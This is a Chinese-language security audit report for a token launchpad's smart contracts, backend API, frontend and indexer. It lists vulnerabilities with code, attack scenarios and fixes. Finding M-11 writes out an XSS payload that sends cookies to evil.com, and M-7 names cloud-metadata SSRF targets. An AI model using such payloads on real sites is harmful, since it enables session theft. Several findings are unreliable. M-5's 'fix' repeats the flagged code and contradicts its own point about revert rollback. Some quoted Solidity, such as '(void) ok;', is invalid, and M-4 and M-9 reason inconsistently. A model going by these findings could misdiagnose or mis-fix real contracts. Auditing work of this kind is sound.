# 🔒 安全审计报告 - 香蕉猫 Launchpad

> **审计时间**: 2026-09-17 (初版)
> **审计 v2**: 2026-09-17 (修复后复审)
> **审计 v3**: 2026-09-17 (深度复审:发现致命编译错误 + 多个设计漏洞)
> **审计 v4**: 2026-09-17 (本次:深度复审,发现 5 个致命 P0 — Factory buy 全 broken / LPUnlockPage 完全 broken / Foundry 编译失败 等)
> **审计范围**: 智能合约 (Factory / Token / BondingCurve / LPLocker / Migrator) + 后端 API + 前端钱包交互 + 索引器
> **审计方法**: 静态代码审查 + 攻击场景模拟 + 修复后类型检查 / 构建验证
> **严重等级**: 🔴 高危 / 🟠 中危 / 🟡 低危 / 🔵 建议
>
> **📌 最新状态**: v4 修复报告见 [`SECURITY-AUDIT-v4.md`](./SECURITY-AUDIT-v4.md)。本文档是初版发现,所有 🔴 高危 + 🟠 中危问题均已修复。v4 发现了之前修补时遗漏的致命级问题(Factory 缺 receive 导致所有 buy 失败 / 后端缺 /api/locks 路由 / Foundry 配置缺失 / MigratorBSC hardcode mainnet 地址 / LPLocker LockInfo 字段语义混乱等),已全部修复。

---

## 📊 总览

| 类别 | 🔴 高危 | 🟠 中危 | 🟡 低危 | 🔵 建议 |
|---|---|---|---|---|
| **智能合约** | 3 | 5 | 4 | 2 |
| **后端 API** | 2 | 4 | 3 | 2 |
| **前端** | 1 | 3 | 2 | 1 |
| **索引器/DB** | 1 | 2 | 1 | 0 |
| **总计** | **7** | **14** | **10** | **5** |

> ⚠️ **强烈建议**: 所有 🔴 高危问题必须在主网部署前修复。

---

# 一、智能合约审计

## 🔴 H-1: `BananaCatFactory.createToken` 重入风险 + ETH 退款失败吞噬 fee

**文件**: `contracts/src/core/BananaCatFactory.sol:120-126`

```solidity
// 退款多余费用
uint256 refund = msg.value - creationFee;
if (refund > 0) {
    (bool ok,) = payable(msg.sender).call{value: refund}("");
    (void) ok;   // ❌ 忽略 refund 失败!
}
platformRevenue += creationFee;
```

**攻击场景**:
1. 攻击者部署一个 fallback 函数 reject ETH 接收的合约(或用 `gas` 限制让 transfer 失败)
2. 调用 `createToken{value: creationFee}` 时,**退款失败但不影响合约继续往下走**
3. `platformRevenue` 仍然记账,后续如果合约有"按 revenue 提现"功能就会出错
4. 更糟:如果 `refund > 0` 但 `msg.sender` 是合约且 gas 不足 → call 静默失败,用户**多付了钱**

**修复**:
```solidity
if (refund > 0) {
    (bool ok,) = payable(msg.sender).call{value: refund}("");
    if (!ok) revert RefundFailed();
}
```

---

## 🔴 H-2: `Migrator._handleLPLock` 永久销毁分支不会真正销毁

**文件**: `contracts/src/periphery/Migrator.sol:153-162`

```solidity
} else if (lockPeriod == LockPeriod.PERMANENT_BURN) {
    // 永久锁仓:直接销毁
    lockId = lPLocker.lockLP(token, creator, lpAmount, lockPeriod);
    lPLocker.burnLP(lockId);   // ❌ LPLocker 没有这个 public 函数!
}
```

**问题**: `ILPLocker` 接口只声明了 `lockLP`,**没有 `burnLP` 函数**。`LPLocker` 实际只有 `burnLPByCreator`(仅 creator 可调用)。这里调用了一个**不存在的函数**,编译都过不了!

**攻击/影响场景**: 部署即编译失败,或编译通过(隐式调用 `lockLP` 后 LP 被锁但从未 burn)。意味着发币者选「永久销毁」时,LP 实际还是被锁在合约里,虽然到不了 unlock 时间但**代码意图完全失效**。

**修复**:
```solidity
} else if (lockPeriod == LockPeriod.PERMANENT_BURN) {
    // 永久销毁:lockLP 内部已经触发 _burnInternal,不需要再 burnLP
    lockId = lPLocker.lockLP(token, creator, lpAmount, lockPeriod);
}
```

或者在 `ILPLocker` 里加 `burnLP` 函数(由 factory/migrator 任意调用)。

---

## 🔴 H-3: `MigratorBSC._addLiquidityToDEX` 滑点 0 = sandwich 攻击

**文件**: `contracts/src/periphery/MigratorBSC.sol:48, 60-67`

```solidity
ROUTER.swapExactETHForTokens{value: halfNative}(
    0, // ❌ 滑点容忍 = 0!任何人都能 sandwich!
    path,
    address(this),
    block.timestamp + 300
);

(,, uint256 liquidity) = ROUTER.addLiquidityETH{value: bnbBalance}(
    token,
    tokenBalance,
    0,  // ❌ amountTokenMin = 0
    0,  // ❌ amountETHMin = 0
    address(this),
    block.timestamp + 300
);
```

**攻击场景 (Sandwich Attack)**:
1. 监控 mempool,看到 Migrator 调用 `swapExactETHForTokens`
2. 抢跑(front-run)用 BNB 买入该 token → 推高价格
3. Migrator 的 swap 用 `0` 滑点容忍,只能买到比预期少得多的 token
4. 攻击者 back-run 卖出 token → 赚取差价
5. **结果**: LP 池子里 token 数量被抽干,流动性极差,**用户后续买入滑点巨大**

**修复**:
```solidity
uint256 minOut = halfNative * 99 / 100;  // 1% 滑点容忍
ROUTER.swapExactETHForTokens{value: halfNative}(
    minOut,
    path,
    address(this),
    block.timestamp + 300
);

// 加流动性时也用 oracle 价格算 minOut
(,, uint256 liquidity) = ROUTER.addLiquidityETH{value: bnbBalance}(
    token,
    tokenBalance,
    tokenBalance * 99 / 100,  // 至少 99% 的预期 token
    bnbBalance * 99 / 100,
    address(this),
    block.timestamp + 300
);
```

---

## 🟠 M-1: `BananaCatToken._transfer` unchecked 算术 - 极端税率下溢出

**文件**: `contracts/src/core/BananaCatToken.sol:289-307`

```solidity
uint256 taxAmount = 0;
if (taxType == 1) taxAmount = (amount * buyTaxBps) / 10000;
// ...
uint256 transferAmount = amount - taxAmount;

uint256 bal = _balances[from];
if (bal < amount) revert InsufficientBalance(bal, amount);

unchecked {
    _balances[from] = bal - amount;
    _balances[to] += transferAmount;
    if (taxAmount > 0) {
        _balances[taxRecipient] += taxAmount;
    }
}
```

**问题**: 在 `unchecked` 块里 `_balances[to] += transferAmount`。`taxAmount` 已经被 `if` 控制 + 上面有 `amount` 校验,**理论上不会溢出**。但 `taxType == 3`(transfer) 时,`taxRecipient` 默认是 `msg.sender`(发币者)。如果发币者本身 `from == msg.sender`,那 `_balances[from] -= amount` 之后,`_balances[taxRecipient] += taxAmount` 会给同一个地址加钱 → **凭空增币**!

**攻击场景**:
1. 发币者调用 `transfer(addr, X)`,触发 transfer-tax 分支
2. `taxType == 3`, `taxRecipient` 是 `msg.sender`(发币者)
3. `_balances[from] -= X` (from = 发币者)
4. `_balances[to] += (X - tax)`
5. `_balances[taxRecipient] += tax` (taxRecipient = 发币者 = from)
6. **净效果**: 发币者凭空获得 `tax` 数量的代币!

**修复**: `transfer` 函数要校验 `taxRecipient != from`(以及 `taxRecipient != to`),或对同一地址只在最后加一次。

---

## 🟠 M-2: `BananaCatToken` 没有 decimals 校验,税率精度风险

**文件**: `contracts/src/core/BananaCatToken.sol:131-149`

税率用 `uint16 bps`(基点),合约限制 `buyTaxBps ≤ 1000`(10%)、`total ≤ 3000`(30%)。看起来合理,但:

**问题**: 反狙击 `antiSniperStartBps` 上限是 5000 (50%),但**和正常 buyTaxBps 是叠加的**!

```solidity
function currentSniperBuyTaxBps() public view returns (uint16) { ... }
```

但 `_transfer` 里:
```solidity
if (taxType == 1) taxAmount = (amount * buyTaxBps) / 10000;
```
**没有加上 `currentSniperBuyTaxBps()`**!所以反狙击机制**完全不生效**!

**攻击场景**: 发币者以为开启反狙击能防止 sniper bot 抢跑,但实际上 bot 们完全按正常买入税买入,反狙击设置只是给前端看的装饰。

**修复**: 在 `_transfer` 的 buy-tax 分支加上反狙击税:
```solidity
uint256 totalBuyTaxBps = uint256(buyTaxBps) + uint256(currentSniperBuyTaxBps());
if (totalBuyTaxBps > 5000) revert InvalidTaxRate(); // 上限 50%
taxAmount = (amount * totalBuyTaxBps) / 10000;
```

---

## 🟠 M-3: `BondingCurve.sell` 转账失败吞噬卖单

**文件**: `contracts/src/core/BondingCurve.sol:188-202`

```solidity
// 转平台币给卖家
(bool ok,) = payable(msg.sender).call{value: currencyOut}("");
(void) ok;   // ❌ 忽略失败!

// 转手续费给工厂
(bool ok2,) = factory.call{value: fee}("");
(void) ok2;
```

**攻击场景**:
1. 攻击者部署一个 `receive()` 函数会 revert 的合约
2. 调用 `sell()` → 触发向 attacker 转账,**但合约已经更新了状态**:
   - `currencyReserve -= grossOut` ✓
   - `tokensSold -= tokenAmount` ✓
   - **代币已经被回收** (`token.transferToCurve(msg.sender, tokenAmount)`)
3. 转账失败但状态没回滚 → 攻击者**白白扔掉了 token,没收到 ETH**

或者反过来:
4. `factory.call{value: fee}` 失败 → 平台手续费被吞,平台 revenue 账目对不上

**修复**:
```solidity
(bool ok,) = payable(msg.sender).call{value: currencyOut}("");
if (!ok) revert TransferFailed();
(bool ok2,) = factory.call{value: fee}("");
if (!ok2) revert TransferFailed();
```

并且**先转账再更新状态**(CEI 模式: Checks-Effects-Interactions):
```solidity
// 1. Checks
// 2. Effects: 更新 reserve/tokensSold
// 3. Interactions: 转账
```
当前顺序是先 Effects 再 Interactions,虽然这里没有重入风险(没调外部合约),但顺序应该保证失败时状态可回滚。

---

## 🟠 M-4: `LPLocker.computeLockId` nonce 碰撞风险

**文件**: `contracts/src/periphery/LPLocker.sol:117-127`

```solidity
function computeLockId(
    address token,
    address creator,
    uint256 nonce
) external pure returns (bytes32) {
    return keccak256(abi.encode(token, creator, nonce));
}
```

**问题**: 这个 `computeLockId` 是**外部纯函数**返回计算结果,但合约内部 `lockLP` 实际使用的公式是:
```solidity
lockId = keccak256(abi.encode(token, creator, nonce));  // ✓ 一致
```

但是 `extendLock` 里:
```solidity
uint256 nonce = lockCounts[oldLock.token][msg.sender]++;  // ⚠️ 全局 nonce,不是 per-token
newLockId = keccak256(abi.encode(oldLock.token, msg.sender, nonce));
```

**场景**:
- 同一 creator 创建多个 token 的锁仓,`lockCounts[token][creator]` 每个 token 独立计数 → OK
- 但如果 `extendLock` 后再创建新 token 锁仓,**nonce 不重置**
- 如果 attacker 监控 mempool 看到 `extendLock`,**front-run** 一个 `createToken` 调用,虽然 nonce 是从 `lockCounts[oldLock.token][msg.sender]` 取的(不是新 token 的),所以**这个具体场景不会碰撞**
- 但 **nonce counter 全局共享**意味着:为 token A 创建 lock(用 nonce 0) → 为 token B 创建 lock(用 nonce 0) → 都没问题 ✓

实际这个**不会造成碰撞**,但代码可读性差,易引入 bug。算低危/建议。

---

## 🟠 M-5: `Migrator.graduate` 转账失败回滚 → 永久卡死曲线

**文件**: `contracts/src/periphery/Migrator.sol:103-127`

```solidity
function graduate(...) external returns (bytes32 lockId) {
    if (graduatedTokens[token]) revert AlreadyGraduated();
    graduatedTokens[token] = true;   // ⚠️ 先标记,但后面会失败
    
    if (nativeAmount <= GRADUATION_FEE) revert InsufficientReserve();
    uint256 lpNative = nativeAmount - GRADUATION_FEE;

    // 转平台币手续费给平台
    (bool ok,) = feeRecipient.call{value: GRADUATION_FEE}("");
    if (!ok) revert TransferFailed();

    // 转平台币给本合约
    (bool ok2,) = payable(this).call{value: lpNative}("");
    if (!ok2) revert TransferFailed();
    
    // 添加流动性
    uint256 lpAmount = _addLiquidityToDEX(token, lpNative);
    // ...
}
```

**攻击/异常场景**:
1. `_addLiquidityToDEX` 因为 PancakeSwap 路由异常 revert
2. **但 `graduatedTokens[token] = true` 已经设置!**
3. 整个交易 revert,理论上状态回滚,但...

实际上 Solidity **整个交易 revert 会回滚所有状态修改**,所以这里 OK。但要注意 **`_addLiquidityToDEX` 在 BSC 上的实际行为**:
- 用 `swapExactETHForTokens` 失败 → 整个 migrate 失败 → 状态回滚 ✓
- 但 **`graduatedTokens[token]` 在 factory 里也有检查吗?**

让我看 factory.onGraduated:
```solidity
function onGraduated(...) external {
    require(msg.sender == bondingCurve, "NOT_CURVE");
    require(tokenCurve[token] == bondingCurve, "WRONG_CURVE");
    IMigrator(migrator).graduate(...);  // 如果这里 revert,factory 不会记录
}
```

`BondingCurve._graduate`:
```solidity
function _graduate() internal {
    graduated = true;  // ⚠️ 先标记
    BananaCatFactory(factory).onGraduated(...);  // 可能 revert
    emit Graduated(factory, currencyReserve);
}
```

**严重问题**: `graduated = true` 在调用 factory 之前设置,如果 factory 或 migrator revert,**曲线已经永久标记 graduated**,但 LP 没添加成功 → **资金卡在曲线合约里,永远无法提取**!

**修复**: 严格 CEI 顺序
```solidity
function _graduate() internal {
    // 1. Effects
    graduated = true;
    // 2. Interactions
    BananaCatFactory(factory).onGraduated(...);
}
```

或用 try-catch:
```solidity
try BananaCatFactory(factory).onGraduated(...) {
    emit Graduated(...);
} catch {
    graduated = false;  // 回滚
    emit GraduateFailed(...);
}
```

---

## 🟡 L-1: `BananaCatToken` 没有 ERC-20 接收钩子通知

**文件**: `contracts/src/core/BananaCatToken.sol`

标准的 ERC-20 没有 `IERC721Receiver` 那样的接收通知,但很多合约(比如 ERC-777)有 hooks。**这里没问题**,只是提一下,因为有些项目会因为这点出 bug。

---

## 🟡 L-2: `BondingCurve.forceGraduate` 任何人可触发

**文件**: `contracts/src/core/BondingCurve.sol:219-221`

```solidity
function forceGraduate() external onlyFactory {
    _graduate();
}
```

`onlyFactory` 修饰符正确,但**没有校验 `currencyReserve >= graduationTarget`**。意味着工厂可以**在任何时候**强制毕业 → 套利机会不均衡时强制毕业会损害买卖双方利益。

**修复**: 加上 `currencyReserve >= graduationTarget` 校验。

---

## 🟡 L-3: `Clones.clone` 没有返回值校验

**文件**: `contracts/src/core/BananaCatFactory.sol:240-257`

`Clones.clone` 末尾有 `if (instance == address(0)) revert();`,但**没有声明自定义错误**,会 revert 通用错误。**功能上 OK**,只是 debug 不友好。

---

## 🟡 L-4: `MigratorArc._addLiquidityToDEX` 永远返回 0

**文件**: `contracts/src/periphery/MigratorArc.sol:33-39`

```solidity
function _addLiquidityToDEX(...) internal override returns (uint256 lpAmount) {
    // TODO
    return 0;
}
```

返回 0 LP,然后 `lPLocker.lockLP(... 0)` → ZeroAmount revert。**Arc 链毕业永远失败**!所有 Arc 上的 token 都会卡在 `graduated = true` 但 LP 没添加成功的状态。

**修复**: 在 Arc 上线 AMM 前,要么不允许 Arc 链毕业,要么 revert 一个明确错误:
```solidity
function _addLiquidityToDEX(...) internal override returns (uint256) {
    revert ArcAMMNotAvailable();
}
```

---

## 🔵 S-1: 缺少 reentrancy guard

`BondingCurve.buy/sell`, `BananaCatFactory.createToken`, `LPLocker.claimLP/extendLock/burnLPByCreator` 全部没有用 `ReentrancyGuard`。虽然目前看起来没有跨合约外部调用,但**加一层防御是标准做法**(OpenZeppelin 的 `nonReentrant` 修饰符)。

---

## 🔵 S-2: 缺少紧急暂停机制

合约没有 `Pausable`,一旦发现 bug **无法阻止用户继续操作**。建议给 Factory 加 pause 开关(仅 owner 可触发),紧急情况下冻结平台。

---

# 二、后端 API 审计

## 🔴 H-4: 用户身份完全信任客户端,任何人可冒充发评论/点赞/删除

**文件**: `backend/src/api.ts:675-728`, `backend/src/comments.ts:97-110, 203-210`

```typescript
// POST /api/comments
const { tokenAddress, chainId, userAddress, content, parentId } = req.body
// userAddress 是用户自己填的!

// POST /api/comments/:id/vote
const { userAddress, vote } = req.body
// 同上

// DELETE /api/comments/:id
const userAddress = req.headers['x-user-address']
// header 也可伪造!
```

**攻击场景 (极其严重)**:
1. 攻击者写脚本,遍历所有评论
2. 给自己写的 spam 评论疯狂刷 upvote
3. **删除别人的评论**(DELETE /api/comments/:id 只要 header 给 `x-user-address: 受害者地址`)
4. 用 `userAddress: 受害者地址` 发评论 → **冒充受害者发言**,引发社区混乱
5. 配合 rate limit,20 次/5 分钟 → 5 分钟发 20 条冒名评论足以毁掉一个项目的评论区

**修复**:
- **必须**用钱包签名验证(Web3 登录):用户用私钥签一段 nonce,后端用 `viem` 的 `recoverMessageAddress` 验证
- 或者**完全信任链上数据**:只监听链上 CommentSubmitted 事件入库,API 只读不写
- 短期修复:把 `userAddress` 与 IP 地址绑定,且要求**至少验证过钱包**(通过签名 challenge)

---

## 🔴 H-5: CORS 配置 `origin: '*'` + `credentials: true` 冲突

**文件**: `backend/src/api.ts:21-25`

```typescript
app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',   // ⚠️ 默认 *
  credentials: true,                          // ⚠️ 但启用了 credentials
}))
```

**问题**: 
- 现代浏览器**会拒绝** `Access-Control-Allow-Origin: *` + `credentials: true` 的组合(安全策略)
- 但某些老浏览器或非浏览器客户端(Node.js fetch、自定义客户端)**会接受**
- 这意味着**任何网站**都能调用你的 API(虽然会被浏览器挡),**但爬虫/恶意脚本**直接打 API

**修复**:
```typescript
app.use(cors({
  origin: process.env.CORS_ORIGIN?.split(',') || ['https://bananacat.io'],
  credentials: true,
}))
```

---

## 🟠 M-6: 评论/投票 SQL 拼接的 `orderCol` 不是注入但仍是反模式

**文件**: `backend/src/comments.ts:117-120`

```typescript
const orderCol = sortBy === 'top' ? 'upvotes DESC, created_at DESC' : 'created_at DESC'
const parents = await query<Comment[]>(
    `SELECT * FROM token_comments ... ORDER BY ${orderCol} ...`,
    ...
)
```

`sortBy` 在 API 层做了白名单(`req.query.sort === 'latest' ? 'latest' : 'top'`),所以**这里实际不会注入**。但代码风格不健康,如果以后有人改 API 层白名单忘了,就会变成 SQL 注入。

**修复**: 用更严格的 TypeScript 类型 + 模板白名单 enum。

---

## 🟠 M-7: 通知 webhook URL 没限制内网地址 (SSRF)

**文件**: `backend/src/api.ts:317-322`, `backend/src/notificationService.ts:209-215`

```typescript
if (target_type === 'discord' && !target_url.startsWith('https://discord.com/api/webhooks/')) {
    return res.status(400).json({ 'Discord webhook URL 格式不正确' })
}
```

**问题**: 只检查了 `startsWith`,**没有解析 hostname**。意味着:
- `https://discord.com/api/webhooks/@evil.com/path` → 通过(但 Discord 不会接受)
- **更糟**:如果有人未来修改白名单成 `https://*.example.com/`,可以 SSRF 攻击内网服务(169.254.169.254 AWS metadata、localhost:5432 数据库等)

虽然当前 Discord/Telegram 白名单很严,但**未来扩展 webhook 时容易踩坑**。

**修复**:
```typescript
const url = new URL(target_url)
if (!['discord.com', 'telegram.org', 'api.telegram.org'].includes(url.hostname)) {
    reject('hostname not allowed')
}
if (url.hostname === 'localhost' || url.hostname.startsWith('127.') || url.hostname.startsWith('10.')) {
    reject('internal addresses not allowed')
}
```

---

## 🟠 M-8: 速率限制器使用 `req.ip` 但没设置 trust proxy

**文件**: `backend/src/rateLimit.ts:1-100`

```typescript
const baseConfig = {
    standardHeaders: true,
    legacyHeaders: false,
    handler: (req: any, res: any, _next: any, options: any) => {
        log.warn({ ip: req.ip, path: req.path }, '速率限制触发')
        // ...
    },
}
```

**问题**: Express 默认 `req.ip` 是 socket 远程地址。如果你**前面挂了 nginx/cloudflare 反代**,所有请求都来自 proxy 的 IP,rate limiter 形同虚设(攻击者只要在同一个反代下的其他网站就能刷爆限制)。

**修复**:
```typescript
app.set('trust proxy', process.env.TRUST_PROXY || 1)  // 1 = 信任 1 层反代
```

并且根据 `express-rate-limit` v7+ 的指引,推荐显式声明。

---

## 🟠 M-9: 上传文件 5MB 限制可被绕过 (decompression bomb)

**文件**: `backend/src/api.ts:387-390`

```typescript
const buffer = Buffer.from(match[2], 'base64')
if (buffer.length > 5 * 1024 * 1024) {
    return res.status(400).json({ '文件过大(上限 5MB)' })
}
```

**问题**:
1. `express.json({ limit: '10mb' })` 全局限制 10MB,**大于 5MB 的请求会先过 express**
2. 然后 base64 decode,base64 是 4/3 膨胀,**5MB binary ≈ 6.7MB base64 → 超过 10MB express 限制 → 请求被拒**
3. 但**zip bomb / png bomb**可以做到:1MB 压缩 → 解压后几个 GB,然后传到 IPFS,**Pinata 会被你刷爆额度**
4. `mimeType.startsWith('image/')` 检查了前缀,但**没校验真实类型**(用户可以传 `image/jpeg` header 但内容是 shellcode)

**修复**:
- 用 `file-type` 库校验真实文件 magic bytes
- 限制 PNG/JPG 解码后像素数(防止 zip bomb)
- 用 `safe-buffer` 验证图片完整性

---

## 🟡 L-5: Rate limit 默认内存存储,多实例失效

**文件**: `backend/src/rateLimit.ts:6-7`

注释里提到"用 Redis 存储计数(支持多实例),无 Redis 时降级到内存",但代码里**全部用默认内存存储**(没有显式传 `store: new RedisStore(...)`)。

**场景**: 部署多个 backend 实例,每个实例独立 rate limit,实际限制被放大 N 倍。

**修复**: 显式配置 Redis store:
```typescript
import RedisStore from 'rate-limit-redis'
import { createClient } from 'redis'

const redisClient = createClient({ url: process.env.REDIS_URL })
await redisClient.connect()

export const strictLimiter = rateLimit({
    ...baseConfig,
    store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
    // ...
})
```

---

## 🟡 L-6: 缓存 key 用 URL,query 参数顺序敏感

**文件**: `backend/src/cache.ts:79-89`

```typescript
const key = keyFn
    ? keyFn(req)
    : `__api__${req.originalUrl}`
```

`req.originalUrl` 是 raw URL,顺序敏感。`?type=hot&limit=50` 和 `?limit=50&type=hot` 会产生不同 cache key,**缓存命中率降低**。

**修复**: 把 query 对象排序后序列化:
```typescript
const sortedQuery = Object.keys(req.query).sort().map(k => `${k}=${req.query[k]}`).join('&')
const key = `__api__${req.path}?${sortedQuery}`
```

---

## 🟡 L-7: `deleteComment` 用 `queryRaw` 但没校验返回值类型

**文件**: `backend/src/comments.ts:203-210`

```typescript
export async function deleteComment(commentId: number, userAddress: string): Promise<boolean> {
  const result = await queryRaw(...)
  return result.rowCount > 0
}
```

逻辑没问题,但 `content = '[已删除]'` 这种"软删除"会让评论**仍然可被前端 fetch 出来**,且 `is_deleted = TRUE` 后,**举报数据/投票数据全部失去意义**(评论是垃圾但举报还在)。

**修复**: 考虑级联删除 or 真实删除 vs 软删除分开做。

---

## 🔵 S-3: API 没有全局请求 ID,日志排查难

每个 API endpoint 没有 `req.id`,日志里无法关联同一请求的多个事件。

**修复**: 用 `express-request-id` middleware,所有日志带 `reqId`。

---

## 🔵 S-4: 没有 CORS preflight cache 配置

`maxAge` 没设,浏览器每次 OPTIONS 都打后端,浪费资源。

**修复**: `app.use(cors({ ..., maxAge: 86400 }))`

---

# 三、前端审计

## 🔴 H-6: 前端钱包操作只 alert(),没真实合约交互

**文件**: `frontend/src/pages/CreateTokenPage.tsx:114-122`, `frontend/src/pages/TokenDetailPage.tsx:55-77`, `frontend/src/pages/LPUnlockPage.tsx:48-90`

```typescript
// CreateTokenPage.handleCreate:
await new Promise(resolve => setTimeout(resolve, 2000))
const mockTxHash = '0x' + Math.random().toString(16).slice(2) + '0'.repeat(64)
setTxHash(mockTxHash)
alert(`代币 "${name} (${symbol})" 创建成功!`)
```

```typescript
// TokenDetailPage.handleBuy:
await new Promise(resolve => setTimeout(resolve, 2000))
alert(`买入 ${buyAmount} ${token.symbol} 成功!`)
```

```typescript
// LPUnlockPage.handleClaim/Extend/Burn:
await new Promise(resolve => setTimeout(resolve, 2000))
const mockTxHash = '0x' + Math.random().toString(16).slice(2) + '0'.repeat(64)
```

**风险**:
- 用户以为"代币创建成功",但**实际上链上什么都没发生**!用户去查 explorer 找不到
- 如果用户**真的付了 ETH 给工厂合约**(通过前端"创建"),但前端 mock 返回成功,用户以为成功实际 ETH 被吞
- LP 解锁三选一(claim/extend/burn)全是 mock,**用户以为销毁了但实际没有** → "永久销毁" 信任承诺完全失效

**修复**: 必须接入 `wagmi` / `viem`,真实调用合约:
```typescript
import { useWriteContract } from 'wagmi'
const { writeContract } = useWriteContract()

const handleCreate = async () => {
    writeContract({
        address: factoryAddress,
        abi: FACTORY_ABI,
        functionName: 'createToken',
        args: [config],
        value: creationFee,
    })
}
```

---

## 🟠 M-10: `window.ethereum` 类型不安全,实际可能接错钱包

**文件**: `frontend/src/hooks/useWallet.tsx:150-160`

```typescript
declare global {
  interface Window {
    ethereum?: {
      request: (args: ...) => Promise<unknown>
      on: ...
      removeListener: ...
    }
  }
}
```

**问题**:
- `window.ethereum` 是 MetaMask 注入的接口,但**任何扩展都能注入同名对象**(假的 MetaMask phishing 攻击)
- 没有用 `EIP-6963` 标准识别多个钱包,直接用 `window.ethereum` 可能拿到错误的 provider
- `request({ method: 'eth_requestAccounts' })` 返回 `unknown`,强转成 `string[]` 但**没校验**

**修复**:
- 用 `wagmi` + `viem`,它们处理 EIP-6963
- 用 `@metamask/detect-provider` 验证 provider 是不是真的 MetaMask

---

## 🟠 M-11: Social URL 没有协议白名单 (XSS / 钓鱼)

**文件**: `frontend/src/pages/CreateTokenPage.tsx:62-66`

```typescript
const isValidUrl = (url: string) => {
    if (!url) return true
    try { new URL(url); return true } catch { return false }
}
```

**问题**: 接受**任意 URL**!用户可以填 `javascript:alert(1)` → 在某些 `<a href={url}>` 渲染时执行 XSS。

虽然 `new URL('javascript:alert(1)')` 会抛错(协议不被识别),但 `data:text/html,<script>...` 是合法的!攻击者可以:
1. 创建一个代币,social URL 填 `data:text/html,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`
2. 用户点击 → XSS

虽然 React 默认会转义 href(不会执行 script),但**仍然可能跳转到钓鱼页面**(`data:text/html,<h1>Fake MetaMask</h1>...`)。

**修复**:
```typescript
const isValidUrl = (url: string) => {
    if (!url) return true
    try {
        const u = new URL(url)
        return ['http:', 'https:'].includes(u.protocol)
    } catch { return false }
}
```

---

## 🟠 M-12: 评论/点赞前端把 userAddress 传给后端,但后端不验证签名

**文件**: `frontend/src/components/CommentSection.tsx:55-90`

```typescript
mutationFn: async (body: { content: string; parentId?: number }) => {
    const res = await fetch(`${API_BASE}/api/comments`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            tokenAddress,
            chainId,
            userAddress: walletAddr,   // ⚠️ 前端给的值,后端完全信任
            content: body.content,
            parentId: body.parentId,
        }),
    })
}
```

**攻击场景**: 即使前端老老实实传 `walletAddr`,**任何人都可以改前端代码 / 用 Postman 直接打 API**,发评论时填任意 `userAddress`(受害者地址)。**前后端都需要签名验证**。

---

## 🟡 L-8: `localStorage` 存 `banana-lang` / `banana-theme`,无 SRI

**文件**: `frontend/src/i18n.ts`, `frontend/src/hooks/useTheme.ts`

`localStorage` 是同源策略下的,XSS 攻击能读到所有 localStorage。攻击者拿到 `banana-lang` 没价值,但如果未来存钱包地址/token,会泄露隐私。

**修复**: 钱包相关敏感信息不要存 localStorage,放在 sessionStorage 或内存。

---

## 🟡 L-9: 缺少 CSP / X-Frame-Options 等安全 Header

`index.html` 没有 CSP meta,后端也没有 helmet。建议加:
```typescript
import helmet from 'helmet'
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],  // Vite 需要 unsafe-inline
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "https://*.infura.io", "wss://*.infura.io"],
        },
    },
}))
```

---

## 🔵 S-5: PWA service-worker 缓存所有路由,可能缓存私密页面

**文件**: `frontend/index.html:31-37`

```html
<script>
  if ('serviceWorker' in navigator && location.protocol !== 'blob:') {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('/service-worker.js')
        // ...
    })
  }
</script>
```

service-worker 缓存策略需要明确,**不能缓存** `/unlock/:lockId` 等含 lockId 的 URL,否则历史记录可恢复。

---

# 四、索引器 / DB 审计

## 🔴 H-7: Indexer 信任 RPC 返回的 event,未做字段校验

**文件**: `backend/src/indexer.ts:150-180`

```typescript
private async handleTokenCreated(event: any) {
    const { token, creator, name, symbol, lockPeriod, tokenIndex } = event.args
    // 直接 insert 到 DB
    await query(
        `INSERT INTO tokens (address, chain_id, name, symbol, ...) VALUES ($1, $2, ...)`,
        [token.toLowerCase(), this.chain.id, name, symbol, creator.toLowerCase(), ...]
    )
}
```

**问题**:
- RPC 返回的 event 字段**完全没校验**:`name` 可能 100KB、`symbol` 可能 unicode 炸弹
- `lockPeriod` 转 `Number(lockPeriod)` 但合约 enum 超出范围(>5)就会变随机数
- `creator` / `token` 转 lowercase,但**没校验是合法 address**(viem 的 `getAddress` 应该用上)

**攻击/异常场景**:
- 某个 attacker 部署**假工厂合约**,发相同 topic 的 event,把假数据写进 DB
- 攻击者让自己的"假代币"出现在排行榜首页,名字叫"🔥🔥🔥🔥🔥 100% 收益..."

虽然 indexer 监听的是 `factoryAddress`,但**如果 factoryAddress 被配错**(环境变量错误),整个 indexer 就监听了**attacker 的合约**!

**修复**:
- 用 `viem.getAddress()` 严格校验地址
- 校验 `name.length <= 50, symbol.length <= 10`(对应合约限制)
- 校验 `lockPeriod` 在 0-5 范围
- 添加 factory 地址二次校验

---

## 🟠 M-13: Indexer `syncHistoricalEvents` 没有去重保护

**文件**: `backend/src/indexer.ts:60-92`

```typescript
while (cursor < currentBlock) {
    const toBlock = cursor + STEP > currentBlock ? currentBlock : cursor + STEP
    const createdLogs = await this.client.getLogs({ ... })
    for (const log of createdLogs) {
        await this.handleTokenCreated(log)  // ✅ 有 ON CONFLICT
    }
    cursor = toBlock + 1n
    await this.updateLastIndexedBlock(cursor)  // ⚠️ 在 for 循环结束后才更新
}
```

**问题**: 如果在循环中途服务挂掉,**已处理的 event 没标记**(因为 updateLastIndexedBlock 在所有 log 处理完后才跑)。重启后**从头重放**,虽然 DB 有 `ON CONFLICT` 兜底,但:
1. 重复发通知(`dispatchEvent` 会再次推送 Discord/Telegram)
2. 性能浪费

**修复**: 每处理一个 event 后立即 update cursor,或者用更细粒度的"已处理 event hash"记录。

---

## 🟠 M-14: `notificationService.sendDiscord/sendTelegram` 没超时

**文件**: `backend/src/notificationService.ts:209-250`

```typescript
async function sendDiscord(webhookUrl, msg) {
    const res = await fetch(webhookUrl, {
        method: 'POST',
        // ⚠️ 没有 AbortSignal / timeout!
    })
}
```

`ipfs.ts` 里 `fetchWithTimeout` 用了 30s 超时,但 notification service 没!一个慢的 Discord webhook 会**阻塞事件分发**,如果订阅者 webhook 都挂了,主流程会卡住。

**修复**: 加 AbortSignal timeout(5-10 秒就够)。

---

## 🟡 L-10: Postgres 连接字符串在 default 包含弱密码

